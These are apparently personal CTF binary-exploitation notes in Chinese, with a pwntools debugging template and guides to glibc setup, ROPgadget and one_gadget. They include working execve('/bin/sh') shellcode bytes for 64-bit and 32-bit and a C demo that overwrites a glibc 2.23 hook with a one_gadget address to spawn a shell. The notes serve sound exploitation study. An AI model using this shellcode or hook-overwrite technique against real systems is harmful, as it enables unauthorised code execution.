# 基础环境

pwn环境搭建主要有下面几个问题：
1. 有些题目需要旧版本的glibc依赖
2. gcc和glibc绑定，新版的gcc不能链接到旧版本的glibc，否则报错。因此新版本gcc编译出的程序可能在较久的系统上无法运行。
3. 不同的glibc导致没有符号，需要设置gdb，因此需要一个模板

## glibc不同版本共存
使用Ubuntu作为基础版本，将libc目录和题目放在一起，就可以使用下面的模板设置gdb带符号带源码调试。


## 模板
使用此模板前要手动执行patchelf，没有写入到模板里因为patchelf有bug，会写坏文件。

```python
from pwn import *
context.log_level='debug'
context.terminal=['bash']
debug=1
gdb_script='''
attach {pid}
source loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''

# write gdb script,use source /tmp/{elf_name}_gdb to load.
def add_gdb_script(elf_name:str,script:str):
    with open("/tmp/{}_gdb".format(elf_name),'w') as f:
        f.write(script)

def ld_libc_source_path(arch:str,version:str):
    libc_source_path="libc/usr/src/glibc/glibc-{}/".format(version)
    if arch=="amd64":
        ld_path="./libc/lib/x86_64-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/x86_64-linux-gnu/libc-{}.so'.format(version)
    elif arch=="i386":
        ld_path="./libc/lib/i386-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/i386-linux-gnu/libc-{}.so'.format(version)
    libc_symbol_path=libc_path.replace("/lib/","/usr/lib/debug/lib/")
    return (ld_path,libc_path,libc_symbol_path,libc_source_path)

# load elf， change this
elf_name='elf_name_change_me'
elf=ELF(elf_name)
context.arch=elf.arch
# libc_start_main_got=elf.got['__libc_start_main']
elf_start=elf.entry


# load libc. default use system libc 
libc_path='/lib/x86_64-linux-gnu/libc.so.6'
ld_path='/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
libc_version="2.23"
# 注释这行使用系统glibc
ld_path,libc_path,libc_symbol_path,libc_source_path=ld_libc_source_path(context.arch,libc_version)
libc=ELF(libc_path)
libc_base=0

# patch elf
# os.system("patchelf --set-interpreter {} {}".format(ld_path,elf_name))
# os.system("patchelf --replace-needed libc.so.6 {} {}".format(libc_path,elf_name))
elf=ELF(elf_name)
remote_addr=['127.0.0.1',4000]
def libc_start_main_addr()->int:
    return libc_base+libc.symbols['__libc_start_main']
def system_addr()->int:
    return libc_base+libc.symbols["system"]
def sh_addr()->int:
    return libc_base+libc.search(b"/bin/sh").__next__()
if debug:
    p=process(elf_name)
else:
    p=remote(remote_addr[0],remote_addr[1])
    
# 注意remote的时候p是没有pid的，随便改个数字
add_gdb_script(elf_name,gdb_script.format(pid=p.pid,libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))

pause()
p.interactive()
```

# Rop
## shellcode
64bit 22bytes: `"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"`
```asm
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
```
32bit 18bytes:````
"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
```asm
; nasm -felf32 shellcode.asm && ld -melf_i386 shellcode.o -o shellcode
section .text
global _start
_start:
push 0x0b
pop eax
push 0x0068732f
push 0x6e69622f
mov ebx, esp
int 0x80
```
使用[[#one_gadget]] 来直接getshell，不需要手动构造system或者execve系统调用。
```c
//glibc2.23
#include<stddef.h>
#include<stdio.h>
#include<stdlib.h>
size_t get_libc_base_addr(){
    size_t addr=(size_t)&printf;
    addr-=0x55810;
    return addr;
}
int main(){
    //start attack
    size_t libc_base_addr=get_libc_base_addr();
    size_t one_gadget=0xf1247;
    printf("libc_base_addr:%p\n",(void*)libc_base_addr);
    // --0x4efe8
    *(size_t *)(libc_base_addr+0x3c4b10)=one_gadget+libc_base_addr;
    malloc(10);

}

```
# Heap
[[ptmalloc]]
# 工具
## ROPgadget

### 安装
有Python和ruby版本的。clone下来后执行`sudo -H python3 -m pip install ROPgadget` 
https://github.com/JonathanSalwan/ROPgadget
### 使用
1.  ROPgadget 得到代码片断
2.  cd80c3 就是 int0x80;ret,使用`ROPgadget --binary {binaryname} --opcode cd80c3`来寻找
3.  动态链接往往没有 int 0x80,需要构造 rop
4.  `ROPgadget --binary {binary_name} --ropchain`可以直接生成 ROP chain，不过要转换一下:
```python
rop = []
# i = 1
for line in open("ropc"):
    # print line,
    if "pack" in line and '+=' in line:
        print line
        # print i
        # print str(line).split(", ")[1].split(")")[0]
        rop.append(str(line).split(", ")[1].split(")")[0])
    if 'pack' not in line and '+=' in line:
        # print i
        # print line
        rop.append(str(line).split("+= ")[1][1:-2])
    # i += 1
i=0
while(i<len(rop)):
    if rop[i]=='/bin':
        rop[i]='0x6e69622f'
    if rop[i]=='//sh':
        rop[i]='0x68732f2f'
    i+=1
print(rop)
```
## one_gadget
常用于rop，如果使用rop技术可以return到one_gatget且满足寄存器要求，则可以直接getshell，这个工具可以搜索glibc中的one_gadget

https://github.com/david942j/one_gadget
直接从 glibc 里 getshell 的函数。 使用-l 1参数可以获得更多gadget ，多尝试一般是可以getshell的。
## LibcDb
根据函数偏移来查找libc版本。不过大部分都是Ubuntu下的libc
libc databases:http://libcdb.com

https://libc.rip/